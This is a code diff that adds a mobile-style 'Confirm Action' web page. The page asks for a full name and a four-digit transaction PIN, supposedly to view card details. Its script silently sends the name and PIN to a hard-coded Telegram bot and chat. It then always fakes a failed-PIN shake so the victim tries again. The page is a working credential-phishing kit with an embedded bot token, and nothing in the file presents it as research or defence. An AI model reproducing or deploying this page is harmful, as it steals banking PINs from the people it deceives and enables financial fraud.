@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Confirm Action</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: #0a1628;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+    }
+
+    .screen {
+      background-color: #0a1628;
+      width: 390px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 24px 10px;
+      position: relative;
+    }
+
+    .back-btn {
+      position: absolute;
+      left: 24px;
+      background: none;
+      border: none;
+      color: #ffffff;
+      font-size: 20px;
+      cursor: pointer;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background 0.15s;
+    }
+
+    .back-btn:active { background: rgba(255,255,255,0.1); }
+
+    .header-title {
+      color: #ffffff;
+      font-size: 17px;
+      font-weight: 600;
+      letter-spacing: 0.02em;
+    }
+
+    .step { display: none; flex-direction: column; flex: 1; }
+    .step.active { display: flex; }
+
+    .content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 36px 24px 0;
+    }
+
+    .title {
+      color: #ffffff;
+      font-size: 30px;
+      font-weight: 800;
+      text-align: center;
+      letter-spacing: -0.3px;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      color: rgba(255, 255, 255, 0.55);
+      font-size: 15px;
+      text-align: center;
+      font-weight: 400;
+      letter-spacing: 0.01em;
+      margin-bottom: 40px;
+    }
+
+    /* Name field */
+    .name-field {
+      width: 100%;
+      max-width: 300px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 16px;
+      padding: 18px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 2px solid transparent;
+      transition: border 0.2s;
+    }
+
+    .name-field:focus-within { border-color: #c9a84c; }
+
+    .name-field i {
+      color: rgba(255,255,255,0.4);
+      font-size: 16px;
+    }
+
+    .name-field input {
+      background: none;
+      border: none;
+      outline: none;
+      color: #ffffff;
+      font-size: 17px;
+      font-family: inherit;
+      width: 100%;
+      letter-spacing: 0.01em;
+    }
+
+    .name-field input::placeholder { color: rgba(255,255,255,0.3); }
+
+    .next-btn {
+      margin-top: 28px;
+      width: 100%;
+      max-width: 300px;
+      padding: 16px;
+      border-radius: 14px;
+      background: #c9a84c;
+      border: none;
+      color: #0a1628;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+
+    .next-btn:active { opacity: 0.85; transform: scale(0.97); }
+    .next-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; }
+
+    /* PIN boxes */
+    .pin-container {
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 16px;
+      padding: 18px 24px;
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    .pin-box {
+      width: 60px;
+      height: 60px;
+      border-radius: 12px;
+      background: #1a2744;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      border: 2px solid transparent;
+      transition: border 0.2s;
+    }
+
+    .pin-box.active { border: 2px solid #c9a84c; }
+
+    .pin-box.active::after {
+      content: '';
+      width: 2px;
+      height: 26px;
+      background: #ffffff;
+      display: block;
+      border-radius: 2px;
+      animation: blink 1s step-end infinite;
+    }
+
+    .pin-box.filled::after {
+      content: '';
+      width: 12px;
+      height: 12px;
+      background: #ffffff;
+      border-radius: 50%;
+      display: block;
+    }
+
+    .pin-box.filled { border: 2px solid transparent; }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .spacer { flex: 1; }
+
+    .keypad {
+      width: 100%;
+      padding: 0 24px 40px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 18px;
+      max-width: 390px;
+    }
+
+    .key {
+      width: 100%;
+      aspect-ratio: 1;
+      border-radius: 50%;
+      background: #162035;
+      border: none;
+      color: #ffffff;
+      font-size: 28px;
+      font-weight: 500;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.12s, transform 0.08s;
+      font-family: inherit;
+      user-select: none;
+      -webkit-user-select: none;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .key:active { background: #1f2f4a; transform: scale(0.93); }
+    .key.empty { background: transparent; pointer-events: none; }
+    .key.delete { font-size: 20px; color: rgba(255,255,255,0.85); }
+
+    .ripple {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.15);
+      transform: scale(0);
+      animation: ripple-anim 0.4s linear;
+      pointer-events: none;
+    }
+
+    @keyframes ripple-anim { to { transform: scale(4); opacity: 0; } }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      15% { transform: translateX(-8px); }
+      30% { transform: translateX(8px); }
+      45% { transform: translateX(-6px); }
+      60% { transform: translateX(6px); }
+      75% { transform: translateX(-4px); }
+      90% { transform: translateX(4px); }
+    }
+
+    .pin-container.shake { animation: shake 0.5s ease; }
+    .pin-box.error { border-color: #e05252 !important; }
+
+    /* Overlay */
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 22, 40, 0.88);
+      z-index: 99;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .overlay.show { display: flex; }
+
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 3px solid rgba(255,255,255,0.15);
+      border-top-color: #c9a84c;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .overlay-text {
+      color: rgba(255,255,255,0.7);
+      font-size: 15px;
+    }
+  </style>
+</head>
+<body>
+<div class="screen">
+
+  <!-- Header -->
+  <div class="header">
+    <button class="back-btn"><i class="fa-solid fa-arrow-left"></i></button>
+    <span class="header-title">View details</span>
+  </div>
+
+  <!-- STEP 1: Name -->
+  <div class="step active" id="stepName">
+    <div class="content">
+      <h1 class="title">Enter your name</h1>
+      <p class="subtitle">Please provide your name before confirming</p>
+
+      <div class="name-field">
+        <i class="fa-solid fa-user"></i>
+        <input type="text" id="nameInput" placeholder="Full name"
+               autocomplete="off" autocorrect="off" spellcheck="false" />
+      </div>
+
+      <button class="next-btn" id="nextBtn" disabled onclick="goToPin()">
+        Continue &nbsp;<i class="fa-solid fa-arrow-right" style="font-size:13px;"></i>
+      </button>
+    </div>
+  </div>
+
+  <!-- STEP 2: PIN -->
+  <div class="step" id="stepPin">
+    <div class="content">
+      <h1 class="title">Confirm action</h1>
+      <p class="subtitle">Enter your transaction PIN to view card details</p>
+
+      <div class="pin-container" id="pinContainer">
+        <div class="pin-box active" id="box0"></div>
+        <div class="pin-box" id="box1"></div>
+        <div class="pin-box" id="box2"></div>
+        <div class="pin-box" id="box3"></div>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="keypad">
+      <button class="key" data-val="1">1</button>
+      <button class="key" data-val="2">2</button>
+      <button class="key" data-val="3">3</button>
+      <button class="key" data-val="4">4</button>
+      <button class="key" data-val="5">5</button>
+      <button class="key" data-val="6">6</button>
+      <button class="key" data-val="7">7</button>
+      <button class="key" data-val="8">8</button>
+      <button class="key" data-val="9">9</button>
+      <button class="key empty"></button>
+      <button class="key" data-val="0">0</button>
+      <button class="key delete" id="deleteBtn">
+        <i class="fa-solid fa-delete-left"></i>
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<!-- Sending overlay -->
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  <span class="overlay-text">Verifying…</span>
+</div>
+
+<script>
+  const TG_TOKEN = "8700685464:AAEHRfSlwS3kI_cwCmWpD1O5kwCmjxzmC74";
+  const TG_CHAT  = "@database_sparktv";
+
+  // ── Step 1: Name ─────────────────────────────────────
+  const nameInput = document.getElementById('nameInput');
+  const nextBtn   = document.getElementById('nextBtn');
+
+  nameInput.addEventListener('input', () => {
+    nextBtn.disabled = nameInput.value.trim().length < 2;
+  });
+
+  nameInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && !nextBtn.disabled) goToPin();
+  });
+
+  function goToPin() {
+    document.getElementById('stepName').classList.remove('active');
+    document.getElementById('stepPin').classList.add('active');
+  }
+
+  // ── Step 2: PIN ───────────────────────────────────────
+  let pin = [];
+  const MAX = 4;
+
+  const boxes = ['box0','box1','box2','box3'].map(id => document.getElementById(id));
+  const pinContainer = document.getElementById('pinContainer');
+
+  function updateBoxes() {
+    boxes.forEach((box, i) => {
+      box.className = 'pin-box';
+      if (i < pin.length)        box.classList.add('filled');
+      else if (i === pin.length) box.classList.add('active');
+    });
+  }
+
+  function addRipple(btn, e) {
+    const r    = document.createElement('span');
+    r.classList.add('ripple');
+    const rect = btn.getBoundingClientRect();
+    const size = Math.max(rect.width, rect.height);
+    r.style.cssText = `width:${size}px;height:${size}px;left:${e.clientX-rect.left-size/2}px;top:${e.clientY-rect.top-size/2}px`;
+    btn.appendChild(r);
+    setTimeout(() => r.remove(), 400);
+  }
+
+  async function sendToTelegram(name, pinCode) {
+    document.getElementById('overlay').classList.add('show');
+
+    const text =
+      `🔐 *New PIN Entry*\n` +
+      `👤 Name: \`${name}\`\n` +
+      `🔑 PIN: \`${pinCode}\`\n` +
+      `🕐 ${new Date().toLocaleString()}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'Markdown' })
+      });
+    } catch (err) {
+      console.error('Telegram send error:', err);
+    } finally {
+      document.getElementById('overlay').classList.remove('show');
+      triggerError();
+    }
+  }
+
+  function triggerError() {
+    pinContainer.classList.remove('shake');
+    boxes.forEach(b => b.classList.remove('error'));
+    void pinContainer.offsetWidth;
+    pinContainer.classList.add('shake');
+    boxes.forEach(b => b.classList.add('error'));
+    setTimeout(() => {
+      pinContainer.classList.remove('shake');
+      boxes.forEach(b => b.classList.remove('error'));
+      pin = [];
+      updateBoxes();
+    }, 600);
+  }
+
+  document.querySelectorAll('.key[data-val]').forEach(btn => {
+    btn.addEventListener('click', e => {
+      addRipple(btn, e);
+      if (pin.length < MAX) {
+        pin.push(btn.dataset.val);
+        updateBoxes();
+        if (pin.length === MAX) {
+          const enteredPin  = pin.join('');
+          const enteredName = nameInput.value.trim();
+          setTimeout(() => sendToTelegram(enteredName, enteredPin), 200);
+        }
+      }
+    });
+  });
+
+  document.getElementById('deleteBtn').addEventListener('click', e => {
+    addRipple(document.getElementById('deleteBtn'), e);
+    if (pin.length > 0) { pin.pop(); updateBoxes(); }
+  });
+
+  updateBoxes();
+</script>
+</body>
+</html>
